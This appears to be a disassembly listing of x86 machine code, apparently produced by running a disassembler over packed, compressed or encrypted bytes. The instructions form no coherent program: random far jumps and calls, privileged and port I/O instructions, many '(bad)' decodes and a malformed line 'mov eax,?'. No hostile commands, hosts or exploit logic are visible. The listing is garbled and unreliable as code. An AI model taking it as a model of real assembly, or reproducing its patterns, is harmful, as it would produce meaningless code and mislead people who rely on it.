  4200bc:	scas   al,BYTE PTR es:[edi]
  4200bd:	xchg   ah,al
  4200bf:	xor    ch,bl
  4200c1:	xor    eax,0x9ddd8aaf
  4200c6:	xchg   ebx,eax
  4200c7:	hlt    
  4200c8:	cmp    esi,DWORD PTR [eax+0x4aa7a2e5]
  4200ce:	inc    esi
  4200cf:	jbe    0x420066
  4200d1:	pop    es
  4200d2:	imul   esp,DWORD PTR [ebx],0x7cc0e25a
  4200d8:	hlt    
  4200d9:	repnz sbb eax,0x20c954b2
  4200df:	jmp    0xe1d293a5
  4200e4:	stos   BYTE PTR es:[edi],al
  4200e5:	(bad)  
  4200e6:	fwait
  4200e7:	sub    al,0xe0
  4200e9:	popa   
  4200ea:	mov    bl,0x4
  4200ec:	sbb    DWORD PTR [eax-0x39e12aed],edi
  4200f2:	cmp    ah,BYTE PTR [ebp-0x63c1f60c]
  4200f8:	add    eax,0x1cf99c8f
  4200fd:	inc    ebp
  4200fe:	imul   eax,ecx,0xffffffbb
  420101:	mov    ds:0x5906aa8f,eax
  420106:	repnz fdivp st(5),st
  420109:	fsubp  st(1),st
  42010b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42010c:	jge    0x420130
  42010e:	sahf   
  42010f:	cmp    al,0x8e
  420111:	nop
  420112:	addr16 pushf 
  420114:	sub    BYTE PTR [edx],bh
  420116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420117:	xlat   BYTE PTR ds:[ebx]
  420118:	sbb    DWORD PTR [ebx+0x5065c86a],0xde7e2667
  420122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420123:	jecxz  0x420154
  420125:	xchg   ebx,eax
  420126:	repnz cld 
  420128:	pop    esp
  420129:	test   BYTE PTR [ebx-0x7d8320a5],bh
  42012f:	jb     0x420156
  420131:	jmp    0x897a2a3b
  420136:	pop    ds
  420137:	xor    eax,DWORD PTR [esi-0x3a]
  42013a:	sbb    al,0xd4
  42013c:	cmp    al,0x3
  42013e:	sub    al,0x53
  420140:	jge    0x420125
  420142:	ret    
  420143:	push   ecx
  420144:	lahf   
  420145:	xchg   ebp,eax
  420146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420147:	fwait
  420148:	and    BYTE PTR [ebx-0x97081f9],ch
  42014e:	dec    eax
  42014f:	stos   BYTE PTR es:[edi],al
  420150:	or     BYTE PTR [ecx],bl
  420152:	mov    esi,0x45ef5c4e
  420157:	xor    ebx,DWORD PTR [edx]
  420159:	adc    esi,DWORD PTR [esi]
  42015b:	jae    0x420150
  42015d:	mov    esp,DWORD PTR [eax+0x1f]
  420160:	sahf   
  420161:	or     DWORD PTR [esi],0xffffffa3
  420164:	xlat   BYTE PTR ds:[ebx]
  420165:	dec    edi
  420166:	push   ds
  420167:	psubq  mm5,QWORD PTR [edx-0x3dd4930f]
  42016e:	jbe    0x42015f
  420170:	sbb    edx,DWORD PTR [esp+edi*1]
  420173:	ds (bad) 
  420175:	sti    
  420176:	(bad)  
  420178:	aaa    
  420179:	fcmove st,st(1)
  42017c:	add    al,0xa8
  42017e:	mov    esi,DWORD PTR [edx]
  420180:	add    BYTE PTR [ebx],bl
  420182:	jnp    0x420188
  420184:	and    eax,0x2896a641
  420189:	daa    
  42018a:	jp     0x4201e1
  42018c:	sbb    DWORD PTR [edx+0x71],ebx
  42018f:	mov    ebp,0xb2998e99
  420194:	pop    ebp
  420195:	xchg   esi,eax
  420196:	inc    esp
  420197:	ds push ecx
  420199:	sub    dh,al
  42019b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42019c:	es retf 0xcd61
  4201a0:	repz in al,0xc3
  4201a3:	retf   
  4201a4:	mov    al,0x65
  4201a6:	lods   al,BYTE PTR ds:[esi]
  4201a7:	(bad)  
  4201a8:	jo     0x42021e
  4201aa:	xor    eax,0x38a08d72
  4201af:	push   ds
  4201b0:	pop    edx
  4201b1:	and    DWORD PTR [eax],0xffffffef
  4201b4:	jns    0x4201e7
  4201b6:	fsub   DWORD PTR [ecx]
  4201b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b9:	jno    0x42016d
  4201bb:	xor    bh,BYTE PTR [edi]
  4201bd:	call   0xfbe3:0x20092573
  4201c4:	jb     0x42016a
  4201c6:	mov    ebp,0xf63563f0
  4201cb:	xchg   edx,eax
  4201cc:	adc    BYTE PTR [ebp+eiz*1-0x3f],dl
  4201d0:	jns    0x420191
  4201d2:	mov    ecx,ecx
  4201d4:	cld    
  4201d5:	aad    0x34
  4201d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201d8:	jp     0x4201e5
  4201da:	inc    ebp
  4201db:	mul    dl
  4201dd:	mov    ds:0x87f84c81,al
  4201e2:	repnz add al,0xad
  4201e5:	iret   
  4201e6:	sub    eax,0x8f50a1f3
  4201eb:	cmp    BYTE PTR [ecx],bl
  4201ed:	cwde   
  4201ee:	and    DWORD PTR [edi-0x2c2493ab],ecx
  4201f4:	sub    eax,DWORD PTR [edi-0x66b3b35e]
  4201fa:	pusha  
  4201fb:	scas   al,BYTE PTR es:[edi]
  4201fc:	fdivr  st,st(7)
  4201fe:	xchg   ecx,eax
  4201ff:	fldcw  WORD PTR [esi-0x658e792a]
  420205:	jb     0x420257
  420207:	dec    esp
  420208:	sahf   
  420209:	dec    ebx
  42020a:	sbb    ecx,DWORD PTR [ecx+0x40]
  42020d:	mov    dl,BYTE PTR gs:[eax-0x5b]
  420211:	mov    eax,0x3dabda93
  420216:	loop   0x420221
  420218:	sahf   
  420219:	or     ecx,DWORD PTR [ecx-0x3e]
  42021c:	and    ah,cl
  42021e:	jg     0x420217
  420220:	shl    BYTE PTR [eax+0x1a],1
  420223:	jg     0x42027c
  420225:	mov    ds:0xcc2c68df,al
  42022a:	outs   dx,BYTE PTR ds:[esi]
  42022b:	call   ecx
  42022d:	jbe    0x420266
  42022f:	xor    al,0x87
  420231:	ins    BYTE PTR es:[edi],dx
  420232:	icebp  
  420233:	mov    edi,0xb535fbb8
  420238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420239:	je     0x420260
  42023b:	test   eax,0x584b5d62
  420240:	sar    BYTE PTR [esp+ecx*2],0xf1
  420244:	paddd  mm3,QWORD PTR [ecx]
  420247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420248:	push   eax
  420249:	not    ecx
  42024b:	push   eax
  42024c:	lds    eax,FWORD PTR [eax]
  42024e:	add    BYTE PTR [eax],al
  420250:	add    BYTE PTR [eax],al
  420252:	xchg   esi,eax
  420253:	test   BYTE PTR [ebp-0x2],al
  420256:	push   edi
  420257:	(bad)  
  420258:	mov    edi,0xa59b80ec
  42025d:	and    bl,cl
  42025f:	add    BYTE PTR ds:[ebx+0x17cbf],bh
  420266:	repz add al,0x0
  420269:	add    BYTE PTR [ecx-0x41],ah
  42026c:	xchg   ebp,ebx
  42026e:	and    al,0x20
  420270:	adc    al,0xdb
  420272:	and    eax,0xfe2ec471
  420277:	add    eax,0xa3c994b3
  42027c:	jmp    0xc4c4:0x6b9b7ca9
  420283:	or     eax,0x3130d549
  420288:	add    DWORD PTR [eax],esp
  42028a:	adc    eax,0x91548e20
  42028f:	imul   ebx,DWORD PTR [ecx-0x6],0x3251691d
  420296:	sbb    eax,0x9f1fc7ff
  42029b:	mov    eax,0x30e588c1
  4202a0:	mov    ds:0x3c21756d,al
  4202a5:	mov    al,ds:0xa169ccf5
  4202aa:	pop    ecx
  4202ab:	int3   
  4202ac:	fisub  DWORD PTR [ecx+eiz*8-0x6c]
  4202b0:	sub    bh,dl
  4202b2:	push   esp
  4202b3:	nop
  4202b4:	loope  0x4202d5
  4202b6:	aad    0x97
  4202b8:	out    0x32,eax
  4202ba:	pushf  
  4202bb:	inc    edx
  4202bc:	out    0x83,al
  4202be:	xlat   BYTE PTR ds:[ebx]
  4202bf:	sbb    edx,DWORD PTR [ebx-0xd9994ad]
  4202c5:	jb     0x42025c
  4202c7:	cmp    DWORD PTR [eax+0x6c],eax
  4202ca:	inc    ebx
  4202cb:	fcmovnbe st,st(2)
  4202cd:	stc    
  4202ce:	lods   eax,DWORD PTR ds:[esi]
  4202cf:	arpl   WORD PTR [esi-0x53ac5fc0],dx
  4202d5:	or     al,0x24
  4202d7:	xor    cl,BYTE PTR ds:0xc6436d3b
  4202dd:	dec    eax
  4202de:	add    edx,DWORD PTR [esi+edi*1]
  4202e1:	push   0x9ea10953
  4202e6:	pop    ebx
  4202e7:	pop    ebx
  4202e8:	pop    edi
  4202e9:	(bad)  
  4202ea:	or     eax,0xe58f301f
  4202ef:	fld    TBYTE PTR [ebx+0x79202eba]
  4202f5:	push   cs
  4202f6:	adc    al,0x21
  4202f9:	adc    eax,0xf1ca4808
  4202fe:	fiadd  DWORD PTR [edx+0x57a062d2]
  420305:	fisubr DWORD PTR [ebp-0x4bca8c75]
  42030b:	mov    edi,ebx
  42030d:	mov    esi,0xb013ccd4
  420312:	ret    0x27a1
  420315:	mov    eax,?
  420317:	mov    esp,0x4d2c7eaf
  42031c:	int    0x9f
  42031e:	js     0x4202c6
  420320:	imul   edi,DWORD PTR [ebp-0x9],0xffffffbc
  420324:	aaa    
  420325:	sub    BYTE PTR [edi+eax*8+0x1bcb6ef5],0x6
  42032d:	xor    esp,eax
  42032f:	sbb    eax,0x8d5418ce
  420334:	fiadd  WORD PTR cs:[esi-0x4e]
  420338:	xor    eax,0xebd16f4b
  42033d:	sub    BYTE PTR [esp+ecx*8-0xe],0x89
  420342:	adc    cl,BYTE PTR [ecx]
  420344:	mov    bh,0xba
  420346:	cmp    ch,bl
  420348:	fst    st(0)
  42034a:	add    bl,0x4a
  42034d:	imul   ebp,DWORD PTR [ecx],0x5465be02
  420353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420354:	test   BYTE PTR [esi],cl
  420356:	add    ch,BYTE PTR [ecx+0x7e6e8453]
  42035c:	std    
  42035d:	vdivps ymm1,ymm4,ymm7
  420361:	xor    DWORD PTR [edi],esi
  420363:	push   es
  420364:	fdivr  DWORD PTR [ecx+0x880bca3]
  42036a:	and    bl,bh
  42036c:	jle    0x4203ad
  42036e:	ret    
  42036f:	or     BYTE PTR [eax],bh
  420371:	push   es
  420372:	push   eax
  420373:	mov    edx,0x5ca34f57
  420378:	mov    ecx,0x72351b0c
  42037d:	dec    edx
  42037e:	aaa    
  42037f:	sbb    BYTE PTR [edi+0x1a],ah
  420382:	retf   0x24d1
  420385:	into   
  420386:	push   eax
  420387:	in     al,dx
  420388:	jg     0x420348
  42038a:	fs inc eax
  42038c:	adc    DWORD PTR [eax+0x16],0x34892a2d
  420393:	jns    0x4203d5
  420395:	cmp    eax,0x38f4d6cb
  42039a:	stc    
  42039b:	jae    0x4203f5
  42039d:	outs   dx,DWORD PTR ds:[esi]
  42039e:	(bad)  
  42039f:	sar    BYTE PTR [ebx-0xc4bfd31],1
  4203a5:	add    al,0xe
  4203a7:	mov    cl,0x13
  4203a9:	xchg   esp,eax
  4203aa:	dec    edx
  4203ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ac:	loope  0x420383
  4203ae:	and    bh,bh
  4203b0:	lahf   
  4203b1:	fcmovbe st,st(3)
  4203b3:	add    dl,dl
  4203b5:	inc    ebp
  4203b6:	xchg   edx,eax
  4203b7:	out    dx,al
  4203b8:	mov    eax,ds:0xb44f3150
  4203bd:	aas    
  4203be:	aaa    
  4203bf:	inc    esp
  4203c0:	jne    0x42040d
  4203c2:	dec    edi
  4203c3:	jle    0x4203c7
  4203c5:	lods   al,BYTE PTR ds:[esi]
  4203c6:	xlat   BYTE PTR ds:[ebx]
  4203c7:	xor    cl,BYTE PTR [eax-0x42]
  4203ca:	pop    edi
  4203cb:	add    bp,WORD PTR [edi]
  4203ce:	sub    DWORD PTR [edx-0x4284f495],0x10
  4203d5:	adc    DWORD PTR [esi],edi
  4203d7:	inc    esp
  4203d8:	outs   dx,DWORD PTR ds:[esi]
  4203d9:	in     al,0xf4
  4203db:	mov    BYTE PTR [ecx],bl
  4203dd:	mov    BYTE PTR [ebx+0x64],al
  4203e0:	jnp    0x420399
  4203e2:	adc    DWORD PTR [ebp-0x157328bd],ebp
  4203e8:	imul   BYTE PTR [esi+edi*2]
  4203eb:	xor    al,0x7f
  4203ed:	in     eax,0x31
  4203ef:	das    
  4203f0:	cmp    edx,DWORD PTR [eax+0x5b]
  4203f3:	icebp  
  4203f4:	pop    esi
  4203f5:	fldlg2 
  4203f7:	cmp    edi,DWORD PTR [ecx]
  4203f9:	dec    edx
  4203fa:	pop    ecx
  4203fb:	sub    DWORD PTR [ebx-0x71],0xffffffb0
  4203ff:	inc    ebx
  420400:	dec    eax
  420401:	fisttp DWORD PTR [ebx+0x31a9eb10]
  420407:	call   0x748cc3b3
  42040c:	xchg   ebx,esi
  42040e:	xchg   ecx,eax
  42040f:	xchg   ecx,eax
  420410:	inc    edx
  420411:	adc    eax,0x30774048
  420416:	sahf   
  420417:	iret   
  420418:	jmp    0x420441
  42041a:	push   eax
  42041b:	cmp    BYTE PTR [ebx],al
  42041d:	add    BYTE PTR [ecx+0x50],0xcf
  420421:	sbb    ecx,0x2597ee97
  420427:	(bad)  
  420428:	mov    edi,ecx
  42042a:	dec    ecx
  42042b:	inc    edi
  42042c:	pop    es
  42042d:	repz xlat BYTE PTR ds:[ebx]
  42042f:	cmp    DWORD PTR [ebx],ebp
  420431:	cmc    
  420432:	call   0x19ac9e3b
  420437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420438:	push   ebx
  420439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043a:	inc    edx
  42043b:	push   esp
  42043c:	stos   DWORD PTR es:[edi],eax
  42043d:	gs mov ebp,0x446dde02
  420443:	ss jne 0x4203c8
  420446:	mov    edi,0x4c4ad04d
  42044b:	pinsrw mm3,WORD PTR [edi-0x5d],0xdf
  420450:	fwait
  420451:	push   0x15
  420453:	pop    ecx
  420454:	ds aad 0xa5
  420457:	mov    bl,0x60
  420459:	and    BYTE PTR [ebx+0x1e],bh
  42045c:	dec    eax
  42045d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42045e:	sub    eax,0x7ea33e02
  420463:	cmc    
  420464:	test   ebx,ebx
  420466:	push   DWORD PTR [esi]
  420468:	repz or DWORD PTR [eax],ecx
  42046b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046c:	cdq    
  42046d:	mov    esi,ebx
  42046f:	(bad)  
  420470:	fstp   QWORD PTR [eax-0xc]
  420473:	les    esi,FWORD PTR [ebp+ebp*1-0x53]
  420477:	data16 mov BYTE PTR [esi-0x789de98e],al
  42047e:	cmp    dh,BYTE PTR [ebp+ecx*1-0x151b6873]
  420485:	loop   0x4204a6
  420487:	inc    ebp
  420488:	cld    
  420489:	jmp    0xd9f:0x6edf958b
  420490:	lods   al,BYTE PTR ds:[esi]
  420491:	fisttp DWORD PTR ds:0x96f6b3fe
  420497:	loope  0x42050c
  420499:	cmc    
  42049a:	cmp    ch,BYTE PTR [ebp-0x5d1c1fed]
  4204a0:	and    ebx,DWORD PTR [eax+0x44774abd]
  4204a6:	pop    ecx
  4204a7:	imul   esi,eax,0x46f3ca02
  4204ad:	or     BYTE PTR [edi],bl
  4204af:	call   0x8d29:0x4c0932bb
  4204b6:	jp     0x4204b5
  4204b8:	(bad)  
  4204ba:	push   ebp
  4204bb:	add    bh,BYTE PTR [esi+0x56894766]
  4204c1:	pop    ebx
  4204c2:	jns    0x42053c
  4204c4:	test   al,0x9c
  4204c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204c7:	ss dec eax
  4204c9:	lea    edi,[ebp-0x6f8537ac]
  4204cf:	xor    eax,0x4a18b412
  4204d4:	ds (bad) 
  4204d6:	iret   
  4204d7:	mov    dh,0xf5
  4204d9:	(bad)  
  4204da:	out    dx,eax
  4204db:	ret    
  4204dc:	and    esp,ebp
  4204de:	nop
  4204df:	push   es
  4204e0:	adc    al,0xab
  4204e2:	adc    al,0xaf
  4204e4:	aad    0x89
  4204e6:	jmp    0x4204df
  4204e8:	pusha  
  4204e9:	xchg   esi,eax
  4204ea:	jns    0x42046d
  4204ec:	addr16 mov dl,0x11
  4204ef:	adc    eax,0x1709df88
  4204f4:	pop    ebx
  4204f5:	(bad)  
  4204f6:	pusha  
  4204f7:	xor    ebp,DWORD PTR [ebx-0x468041f2]
  4204fd:	and    eax,0xeecdaac
  420502:	dec    ebx
  420503:	jae    0x420571
  420505:	psadbw mm5,QWORD PTR [esp+esi*1]
  420509:	adc    eax,0xf3396ecc
  42050e:	rcl    BYTE PTR [ebp-0x4b],0xf2
  420512:	sub    ebp,ecx
  420514:	push   ds
  420515:	pop    esp
  420516:	add    eax,0x6a7b5e1c
  42051b:	aam    0xfe
  42051d:	pop    es
  42051e:	int    0x84
  420520:	xor    bl,al
  420522:	test   al,0x97
  420524:	scas   al,BYTE PTR es:[edi]
  420525:	inc    esi
  420526:	pop    edx
  420527:	cmp    BYTE PTR [edx],cl
  420529:	idiv   BYTE PTR [ecx+eax*8-0x789ee3d9]
  420530:	jle    0x4204fa
  420532:	je     0x42050e
  420534:	xchg   DWORD PTR [edx],esi
  420536:	scas   eax,DWORD PTR es:[edi]
  420537:	jg     0x42056c
  420539:	std    
  42053a:	jge    0x420581
  42053c:	cmp    al,0x7b
  42053e:	dec    ecx
  42053f:	shr    DWORD PTR [edx+0x6db5ef43],0x53
  420546:	test   DWORD PTR [ebp-0x5a],esp
  420549:	push   eax
  42054a:	and    eax,0x7bc70e85
  42054f:	aam    0x3b
  420551:	sub    cl,cl
  420553:	enter  0x1159,0x16
  420557:	(bad)  
  420558:	fcmovnu st,st(0)
  42055a:	enter  0xf2f3,0x71
  42055e:	sub    bl,BYTE PTR [esi]
  420560:	and    al,0x53
  420562:	loopne 0x420509
  420564:	lahf   
  420565:	iret   
  420566:	cmp    DWORD PTR [ebx+0x67458eac],ecx
  42056c:	iret   
  42056d:	mov    esi,0x23999702
  420572:	or     eax,DWORD PTR [edx]
  420574:	cli    
  420575:	adc    ecx,esi
  420577:	sub    al,0x96
  420579:	in     al,0x4a
  42057b:	push   edi
  42057c:	not    edx
  42057e:	mov    cl,0x58
  420580:	ins    DWORD PTR es:[edi],dx
  420581:	or     al,0xe6
  420583:	ret    
  420584:	mov    edx,DWORD PTR [ebx-0x4f]
  420587:	je     0x4205e9
  420589:	fld    QWORD PTR [esi-0x3fcd5608]
  42058f:	pusha  
  420590:	les    ecx,FWORD PTR [ecx]
  420592:	and    al,BYTE PTR [esi-0x7c]
  420595:	sub    DWORD PTR es:[ecx-0x6e],edx
  420599:	call   0x23aaac
  42059e:	(bad)  
  42059f:	call   0x3700:0x9d99d0e3
  4205a6:	iret   
  4205a7:	(bad)  
  4205a8:	dec    ebp
  4205a9:	sub    BYTE PTR [ecx],0xe4
  4205ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205ad:	test   DWORD PTR [edi+0x1d8860f4],esi
  4205b3:	out    0xd1,eax
  4205b5:	mov    BYTE PTR [ecx+0x5],ch
  4205b8:	add    al,bh
  4205ba:	mov    edx,0x46c7cce9
  4205bf:	mov    WORD PTR [ebp-0x73],cs
  4205c2:	pop    ebx
  4205c3:	cmp    ah,dl
  4205c5:	inc    edx
  4205c6:	dec    ebx
  4205c7:	imul   eax,DWORD PTR [edx-0x2ba0dcb8],0xd9498c25
  4205d1:	scas   al,BYTE PTR es:[edi]
  4205d2:	cmp    BYTE PTR [ebp-0x4],bl
  4205d5:	mov    al,ds:0xd7c91c98
  4205da:	push   0xffffff8a
  4205dc:	xor    eax,0x53da89a0
  4205e1:	jge    0x420563
  4205e3:	ret    0x9254
  4205e6:	ret    0x3257
  4205e9:	(bad)  
  4205ea:	dec    BYTE PTR [ebx+0x64868785]
  4205f0:	clc    
  4205f1:	test   edx,ebx
  4205f3:	mov    ecx,0x795b7917
  4205f8:	ret    
  4205f9:	xchg   dl,ch
  4205fb:	mov    bl,0xd7
  4205fd:	or     dl,BYTE PTR [edi+eax*1]
  420600:	fdiv   QWORD PTR [edi]
  420602:	mov    cl,0x18
  420604:	pop    ebx
  420605:	call   0xb4c1ff34
  42060a:	(bad)  
  42060b:	out    0xb0,al
  42060d:	mov    dh,BYTE PTR [edx+0x1f]
  420610:	fwait
  420611:	jno    0x420667
  420613:	in     al,0x20
  420615:	inc    edx
  420616:	loop   0x4205a5
  420618:	add    al,0xef
  42061a:	les    edx,FWORD PTR [eax]
  42061c:	call   0x4e1b:0x8f277398
  420623:	pop    es
  420624:	pop    esi
  420625:	push   es
  420626:	pop    ecx
  420627:	lea    esp,[edx+0x0]
  42062a:	push   ecx
  42062b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42062c:	adc    ah,BYTE PTR [edi]
  42062e:	sub    DWORD PTR [edx+0x59],ebx
  420631:	dec    edi
  420632:	xlat   BYTE PTR ds:[ebx]
  420633:	loope  0x42066e
  420635:	pop    es
  420636:	adc    DWORD PTR [ebp-0x48],eax
  420639:	mov    ebx,0xa25c5c6a
  42063e:	cmp    DWORD PTR [ebp+0x74],eax
  420641:	retf   0xde2e
  420644:	xchg   edi,eax
  420645:	cmp    al,0xbb
  420647:	aas    
  420648:	jno    0x420639
  42064a:	mov    esp,0x1afcc3c7
  42064f:	inc    esp
  420650:	cmp    eax,0x60f7798b
  420655:	fist   WORD PTR [edx]
  420657:	fild   WORD PTR [edx-0x527e30eb]
  42065d:	sbb    al,0x0
  420660:	mov    al,0xee
  420662:	add    al,0x76
  420664:	hlt    
  420665:	lock dec edx
  420667:	loop   0x4205ff
  420669:	pop    ebp
  42066a:	jnp    0x420687
  42066c:	cmp    DWORD PTR [ebx],0xbf292311
  420672:	in     eax,0x7b
  420674:	jns    0x420673
  420676:	pushf  
  420677:	xchg   DWORD PTR ds:0x14e55022,eax
  42067d:	xchg   ecx,eax
  42067e:	sub    ah,BYTE PTR [edi-0x4b]
  420681:	mov    esi,0xa02bc77a
  420686:	test   al,bl
  420688:	std    
  420689:	in     eax,0x87
  42068b:	or     al,0xa1
  42068d:	addr16 (bad) 
  42068f:	inc    edi
  420690:	sti    
  420691:	sbb    ecx,edi
  420693:	push   0x3f
  420695:	ss xor ah,cl
  420698:	pop    es
  420699:	pop    edi
  42069a:	hlt    
  42069b:	stc    
  42069c:	leave  
  42069d:	cs sub al,0xd
  4206a0:	jne    0x420628
  4206a2:	test   dh,al
  4206a4:	jno    0x420701
  4206a6:	sbb    eax,0xa132592
  4206ab:	leave  
  4206ac:	add    DWORD PTR [esi],0x7b
  4206af:	pop    ss
  4206b0:	outs   dx,BYTE PTR ds:[esi]
  4206b1:	sub    DWORD PTR ds:0x405f7866,edx
  4206b7:	idiv   ch
  4206b9:	mov    ds:0xaf8fce8e,eax
  4206be:	push   ebp
  4206bf:	inc    esp
  4206c0:	push   ss
  4206c1:	lods   al,BYTE PTR ds:[esi]
  4206c2:	mov    al,ds:0x16f875a6
  4206c7:	fbld   TBYTE PTR [ebp+ebx*2-0x7]
  4206cb:	fcmovnbe st,st(4)
  4206cd:	addps  xmm6,XMMWORD PTR [eax+0x61801231]
  4206d4:	enter  0xf90d,0xd2
  4206d8:	cmp    BYTE PTR [ebp+ecx*4-0x7f86068],bh
  4206df:	out    0x47,al
  4206e1:	cmp    bl,BYTE PTR [ebx]
  4206e3:	pusha  
  4206e4:	xchg   ecx,eax
  4206e5:	push   eax
  4206e6:	jge    0x420710
  4206e8:	sub    ch,BYTE PTR [esp+edx*4]
  4206eb:	bound  edi,QWORD PTR [esi]
  4206ed:	daa    
  4206ee:	gs ret 0x9b9b
  4206f2:	ret    0xfd64
  4206f5:	shl    BYTE PTR [eax],1
  4206f7:	mov    ebx,0x58c95797
  4206fc:	mov    esp,0x8c48d53f
  420701:	or     al,0x73
  420703:	add    esp,edi
  420705:	jae    0x420699
  420707:	and    dl,BYTE PTR [ecx+eiz*1-0x6549846b]
  42070e:	leave  
  42070f:	or     DWORD PTR [ebp-0x3f],esi
  420712:	fdiv   DWORD PTR [eax]
  420714:	hlt    
  420715:	dec    esi
  420716:	adc    eax,0x76c720fa
  42071b:	inc    ebx
  42071c:	and    bl,0xb2
  42071f:	inc    DWORD PTR [esi-0x29a6af3e]
  420725:	jmp    0xec40f2fc
  42072a:	push   cs
  42072b:	(bad)  
  42072c:	aad    0xa4
  42072e:	xor    esi,0xffffffd2
  420731:	mov    esp,0x2d6df8f2
  420736:	and    BYTE PTR [ebp-0x396d75a3],cl
  42073c:	or     ecx,DWORD PTR [edi+ecx*1-0x2804c7f3]
  420743:	shr    BYTE PTR [ebp+edx*1+0x4b765049],0xa1
  42074b:	fcomp  QWORD PTR ds:0x448f26b7
  420751:	cmp    eax,0xd3491a77
  420756:	pop    es
  420757:	stc    
  420758:	addr16 sub al,0x4a
  42075b:	sbb    BYTE PTR [ecx],cl
  42075d:	add    BYTE PTR [eax],al
  42075f:	add    BYTE PTR [eax],al
  420761:	add    BYTE PTR [ecx],ah
  420763:	pop    ds
  420764:	fld    QWORD PTR [esi]
  420766:	inc    esi
  420768:	sti    
  420769:	aas    
  42076a:	jb     0x42078b
  42076c:	add    edx,edx
  42076e:	mov    dl,0x9d
  420770:	add    BYTE PTR [ecx+0x181b2],bh
  420776:	repz add al,0x0
  420779:	add    ah,bl
  42077b:	dec    edi
  42077c:	in     al,dx
  42077d:	nop
  42077e:	push   cs
  42077f:	out    0x87,eax
  420781:	(bad)
  420784:	pop    ebx
  420785:	add    bl,BYTE PTR [ebx+edx*4+0x1b5e5372]
  42078c:	cmp    ch,BYTE PTR [edx-0xaa909b5]
  420792:	mov    esp,0xf9f53fd3
  420797:	lock or DWORD PTR [ebx],esp
  42079a:	push   0x69
  42079c:	cmp    ah,BYTE PTR [esi-0x595ed777]
  4207a2:	mov    ch,0xac
  4207a4:	mov    ds:0x66828851,al
  4207a9:	in     eax,dx
  4207aa:	xchg   DWORD PTR [edi+0x573d23d2],esp
  4207b0:	sbb    DWORD PTR [eax],edx
  4207b2:	jmp    FWORD PTR [ebp+0xd]
  4207b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207b6:	jne    0x420802
  4207b8:	or     DWORD PTR [edi],edx
  4207ba:	mov    edx,0x19838111
  4207bf:	ds ja  0x4207fe
  4207c2:	mov    eax,ds:0x75087ebd
  4207c7:	scas   eax,DWORD PTR es:[edi]
  4207c8:	imul   ebx,DWORD PTR [ecx-0x74a93490],0xb70b10de
  4207d2:	push   edi
  4207d3:	scas   eax,DWORD PTR es:[edi]
  4207d4:	or     eax,0x547a7da2
  4207d9:	into   
  4207da:	ja     0x420776
  4207dc:	jmp    0x4207c4
  4207de:	dec    edi
  4207df:	pop    ebx
  4207e0:	mov    ebx,0x3f171457
  4207e5:	sti    
  4207e6:	ss (bad) 
  4207e8:	sub    DWORD PTR [eax+eax*8+0x7e9a02e0],ebp
  4207ef:	and    DWORD PTR [ebp-0x7d],edx
  4207f2:	adc    DWORD PTR [eax+0x47b88f2b],0x4a
  4207f9:	dec    eax
  4207fa:	xlat   BYTE PTR ds:[ebx]
  4207fb:	out    dx,eax
  4207fc:	push   ss
  4207fd:	(bad)  
  4207fe:	pop    esi
  4207ff:	dec    ebx
  420800:	stc    
  420801:	fild   DWORD PTR [edx+ecx*1-0x7eafc0b4]
  420808:	(bad)  
  420809:	fld    TBYTE PTR [ebp+0x10]
  42080c:	mov    ds:0xbd951751,al
  420811:	inc    edx
  420812:	jmp    0xd829:0x16a3c8c2
  420819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42081a:	aaa    
  42081b:	sub    al,0xb7
  42081d:	xchg   ebx,eax
  42081e:	inc    ecx
  42081f:	jmp    0xd1291fb0
  420824:	ror    cl,1
  420826:	ss (bad) 
  420828:	dec    edi
  420829:	pop    eax
  42082a:	in     al,0x78
  42082c:	fisttp QWORD PTR [ebx]
  42082e:	das    
  42082f:	xchg   ebx,eax
  420830:	pop    ss
  420831:	or     BYTE PTR [eax-0x2b],al
  420834:	push   cs
  420835:	leave  
  420836:	das    
  420837:	or     DWORD PTR [esi-0xd49af5],ecx
  42083d:	fwait
  42083e:	xchg   edi,eax
  42083f:	add    cl,ah
  420841:	xchg   ebx,eax
  420842:	inc    ebx
  420843:	xchg   edx,eax
  420844:	jb     0x420801
  420846:	sbb    eax,0xa0d76a8d
  42084b:	xchg   edi,eax
  42084c:	push   ebx
  42084d:	es stos DWORD PTR es:[edi],eax
  42084f:	adc    edx,ebx
  420851:	mov    ebp,0x7a03323a
  420856:	cmp    esi,ebp
  420858:	test   esi,esi
  42085a:	rol    DWORD PTR [esi],1
  42085c:	and    al,0x81
  42085e:	hlt    
  42085f:	dec    esp
  420860:	shl    DWORD PTR [ebp-0x2f989289],cl
  420866:	adc    eax,0xb9155a8c
  42086b:	mov    ds:0xb4171ddb,al
  420870:	push   esi
  420871:	daa    
  420872:	sub    eax,0x6a28f25d
  420877:	and    al,0x94
  420879:	out    dx,al
  42087a:	mov    edx,0xe46f878d
  42087f:	sub    al,0x31
  420881:	mov    al,0x82
  420883:	scas   eax,DWORD PTR es:[edi]
  420884:	fld    QWORD PTR [ebp-0x18]
  420887:	inc    ebp
  420888:	jb     0x420818
  42088a:	daa    
  42088b:	jbe    0x420862
  42088d:	ficomp DWORD PTR [esi+0x66]
  420890:	xchg   edx,eax
  420891:	sti    
  420892:	test   BYTE PTR [ebx-0x6a],ah
  420895:	int3   
  420896:	stos   BYTE PTR es:[edi],al
  420897:	loop   0x4208cf
  420899:	sub    edx,DWORD PTR [esi+0x43]
